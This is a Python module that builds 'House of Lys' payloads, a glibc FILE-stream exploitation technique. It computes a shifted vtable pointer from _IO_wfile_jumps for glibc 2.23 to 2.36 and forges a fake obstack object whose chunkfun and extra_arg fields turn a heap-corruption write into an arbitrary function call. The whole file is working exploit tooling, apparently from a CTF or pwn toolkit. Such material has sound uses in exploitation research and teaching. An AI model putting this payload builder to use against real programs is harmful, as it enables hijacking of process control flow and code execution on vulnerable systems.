"""House of Lys payload builders."""

from __future__ import annotations

from dataclasses import dataclass


FILE_VTABLE = 0xD8
FILE_OBSTACK = 0xE0
FILE_IMAGE_SIZE = 0xE8
OBSTACK_CHUNKFUN = 0x38
OBSTACK_EXTRA_ARG = 0x40
OBSTACK_USE_EXTRA_ARG = 0x50
OBSTACK_OBJECT_BASE = 0x58
OBSTACK_NEXT_FREE = 0x60
OBSTACK_CHUNK_LIMIT = 0x68
OBSTACK_IMAGE_SIZE = 0x70
UINT64_LIMIT = 1 << 64


@dataclass(frozen=True)
class MemoryWrite:
    address: int
    data: bytes
    label: str


@dataclass(frozen=True)
class LysPlan:
    version: str
    primary_vtable_addr: int
    obstack_addr: int
    object_base: int
    next_free: int
    chunk_limit: int
    chunkfun_addr: int
    extra_arg: int


def _check_uint64(name: str, value: int) -> None:
    if not isinstance(value, int) or isinstance(value, bool):
        raise TypeError(f"{name} must be an integer")
    if value < 0 or value >= UINT64_LIMIT:
        raise ValueError(f"{name} must fit uint64")


def _pack64(value: int) -> bytes:
    _check_uint64("value", value)
    return value.to_bytes(8, "little")


def _primary_vtable(version: str, wfile_jumps_addr: int) -> int:
    if version == "2.23":
        delta = -0x1120
    elif version in {f"2.{minor}" for minor in range(24, 37)}:
        delta = 0x300
    else:
        raise ValueError("Lys supports glibc 2.23 through 2.36")
    return wfile_jumps_addr + delta + 0x20


def build_house_of_lys(
    *,
    version: str,
    wfile_jumps_addr: int,
    obstack_addr: int,
    chunkfun_addr: int,
    extra_arg: int,
    object_base: int = 0,
    next_free: int = 1,
    chunk_limit: int = 0,
) -> LysPlan:
    """Return the shifted primary vtable and fake obstack field plan."""

    for name, value in {
        "wfile_jumps_addr": wfile_jumps_addr,
        "obstack_addr": obstack_addr,
        "chunkfun_addr": chunkfun_addr,
        "extra_arg": extra_arg,
        "object_base": object_base,
        "next_free": next_free,
        "chunk_limit": chunk_limit,
    }.items():
        _check_uint64(name, value)

    return LysPlan(
        version=version,
        primary_vtable_addr=_primary_vtable(version, wfile_jumps_addr),
        obstack_addr=obstack_addr,
        object_base=object_base,
        next_free=next_free,
        chunk_limit=chunk_limit,
        chunkfun_addr=chunkfun_addr,
        extra_arg=extra_arg,
    )


def build_house_of_lys_payload(
    *,
    version: str,
    file_addr: int,
    wfile_jumps_addr: int,
    obstack_addr: int,
    chunkfun_addr: int,
    extra_arg: int,
    object_base: int = 0,
    next_free: int = 1,
    chunk_limit: int = 0,
) -> tuple[MemoryWrite, ...]:
    """Build FILE and obstack writes for the Lys sink."""

    _check_uint64("file_addr", file_addr)
    plan = build_house_of_lys(
        version=version,
        wfile_jumps_addr=wfile_jumps_addr,
        obstack_addr=obstack_addr,
        chunkfun_addr=chunkfun_addr,
        extra_arg=extra_arg,
        object_base=object_base,
        next_free=next_free,
        chunk_limit=chunk_limit,
    )

    file_image = bytearray(FILE_IMAGE_SIZE)
    file_image[FILE_VTABLE:FILE_VTABLE + 8] = _pack64(plan.primary_vtable_addr)
    file_image[FILE_OBSTACK:FILE_OBSTACK + 8] = _pack64(plan.obstack_addr)

    obstack_image = bytearray(OBSTACK_IMAGE_SIZE)
    obstack_image[OBSTACK_CHUNKFUN:OBSTACK_CHUNKFUN + 8] = _pack64(plan.chunkfun_addr)
    obstack_image[OBSTACK_EXTRA_ARG:OBSTACK_EXTRA_ARG + 8] = _pack64(plan.extra_arg)
    obstack_image[OBSTACK_USE_EXTRA_ARG:OBSTACK_USE_EXTRA_ARG + 4] = (1).to_bytes(4, "little")
    obstack_image[OBSTACK_OBJECT_BASE:OBSTACK_OBJECT_BASE + 8] = _pack64(plan.object_base)
    obstack_image[OBSTACK_NEXT_FREE:OBSTACK_NEXT_FREE + 8] = _pack64(plan.next_free)
    obstack_image[OBSTACK_CHUNK_LIMIT:OBSTACK_CHUNK_LIMIT + 8] = _pack64(plan.chunk_limit)

    return (
        MemoryWrite(file_addr, bytes(file_image), "Lys FILE fields"),
        MemoryWrite(plan.obstack_addr, bytes(obstack_image), "fake obstack object"),
    )
